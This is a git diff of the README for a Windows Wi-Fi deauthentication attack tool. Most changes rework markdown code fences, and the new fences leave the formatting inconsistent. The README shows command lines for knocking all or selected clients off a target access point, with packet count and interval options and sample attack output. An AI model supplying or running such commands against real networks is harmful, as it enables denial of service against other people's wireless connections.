@@ -123,7 +123,7 @@ python deauth.py list
 
 🚀 Usage Guide
 Basic Syntax
-bash
+```bash
 python deauth.py <interface> <bssid> [options]
 Command Line Arguments
 Argument	Description	Required	Default
@@ -134,8 +134,9 @@ bssid	Target AP MAC address	Yes	-
 -i, --interval	Packet interval (seconds)	No	0.1
 -h, --help	Show help message	No	-
 Quick Start Guide
+````
 1. List Available Interfaces
-bash
+```bash
 # Show all network interfaces
 python deauth.py list
 
@@ -144,12 +145,14 @@ python deauth.py list
 # 1. \Device\NPF_{12345678-1234-5678-1234-567812345678}
 # 2. Wi-Fi
 # 3. Ethernet
+````
 2. Select Your Interface
-bash
+```bash
 # Use the interface name from list
 python deauth.py "Wi-Fi" 00:11:22:33:44:55
 3. Monitor the Attack
-bash
+```
+```bash
 # The tool will show real-time progress
 [+] Starting deauth attack on 00:11:22:33:44:55
 [+] Interface: Wi-Fi
@@ -157,36 +160,42 @@ bash
 [⚡] Attack in progress...
 [+] Sent 10 deauth packets
 [+] Sent 20 deauth packets
+```
 📝 Examples
 Example 1: Basic Attack (All Clients)
-bash
+```bash
 # Deauthenticate all clients from AP
 python deauth.py wlan0 00:11:22:33:44:55
 Example 2: Target Specific Client
-bash
+```
+```bash
 # Deauthenticate specific client
 python deauth.py wlan0 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF
 Example 3: Limited Packet Count
-bash
+```
+```bash
 # Send exactly 100 packets
 python deauth.py wlan0 00:11:22:33:44:55 -n 100
 Example 4: Slow Attack (1 second interval)
-bash
+```
+```bash
 # Send packets slowly
 python deauth.py wlan0 00:11:22:33:44:55 -i 1.0
 Example 5: Fast Attack (0.05 second interval)
-bash
+```
+```bash
 # Send packets very fast
 python deauth.py wlan0 00:11:22:33:44:55 -i 0.05
 Example 6: Complete Command
-bash
+```
+```bash
 # Send 500 packets to specific client with 0.2s interval
 python deauth.py wlan0 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF -n 500 -i 0.2
 🖼️ Output Examples
 Successful Attack Start
 text
 ╔══════════════════════════════════════════════════════════╗
-║     [ STVCBD Sec - Wi-Fi Deauth Tool ] Version 1.0      ║
+║     [ STVCBD Sec - Wi-Fi Deauth Tool ] Version 1.0       ║
 ╚══════════════════════════════════════════════════════════╝
 
 [*] STVCBD Sec - Windows Wi-Fi Deauth Attack
@@ -236,20 +245,23 @@ Code	Description
 5	Disassociated because AP is unable to handle all stations
 7	Class 3 frame received from non-associated station
 8	Disassociated because station is leaving BSS
+```
 🛠️ Troubleshooting
 Common Issues and Solutions
 Issue 1: "No module named scapy"
-bash
+```bash
 # Solution: Install scapy
 pip install scapy
 pip install --upgrade scapy
 Issue 2: "Permission denied"
-bash
+```
+```bash
 # Solution: Run as Administrator
 # Right-click Command Prompt → Run as Administrator
 # Then run your command
 Issue 3: Interface not found
-bash
+```
+```bash
 # Solution: List all interfaces
 python deauth.py list
 
@@ -257,20 +269,24 @@ python deauth.py list
 ipconfig /all
 netsh wlan show interfaces
 Issue 4: No packets being sent
-bash
+```
 # Check:
+```
 # 1. Is monitor mode enabled?
 # 2. Are you close enough to the target?
 # 3. Is the BSSID correct?
 # 4. Is the interface in the right mode?
 Issue 5: Npcap not found
-bash
+```
+```bash
 # Solution: Install Npcap
 # Download from: https://npcap.com
 # Enable "WinPcap API-compatible Mode" during installation
 Verification Commands
-bash
+```
+
 # Check Python version
+```
 python --version
 
 # Check installed packages
@@ -311,6 +327,7 @@ Add comments for complex logic
 Update documentation for new features
 
 Test your changes thoroughly
+```
 
 📄 Disclaimer
 IMPORTANT LEGAL NOTICE
@@ -374,9 +391,10 @@ STVCBD Sec Team
 
 🐦 Telegram: @STVCBD_Sec
 
-💻 GitHub: @STVCBD
+💻 GitHub: @Steven.kh
 
 Support Channels
+
 📚 Documentation
 
 🐛 Issue Tracker
@@ -401,32 +419,6 @@ https://img.shields.io/github/watchers/STVCBD/stvcbd-sec-wifi-deauth?style=socia
 https://img.shields.io/github/issues/STVCBD/stvcbd-sec-wifi-deauth
 https://img.shields.io/github/issues-pr/STVCBD/stvcbd-sec-wifi-deauth
 
-📁 Project Structure
-text
-stvcbd-sec-wifi-deauth/
-│
-├── deauth.py              # Main tool source code
-├── README.md              # This documentation
-├── LICENSE                # License file
-├── requirements.txt       # Python dependencies
-├── .gitignore            # Git ignore file
-│
-├── docs/                  # Documentation
-│   ├── installation.md    # Detailed installation guide
-│   ├── usage.md          # Usage examples
-│   └── api.md            # API documentation
-│
-├── examples/              # Example scripts
-│   ├── basic_attack.py
-│   └── advanced_usage.py
-│
-└── tests/                 # Test files
-    ├── test_deauth.py
-    └── test_utils.py
-📦 requirements.txt
-txt
-scapy>=2.4.5
-colorama>=0.4.4
 🙏 Acknowledgments
 Special thanks to:
 
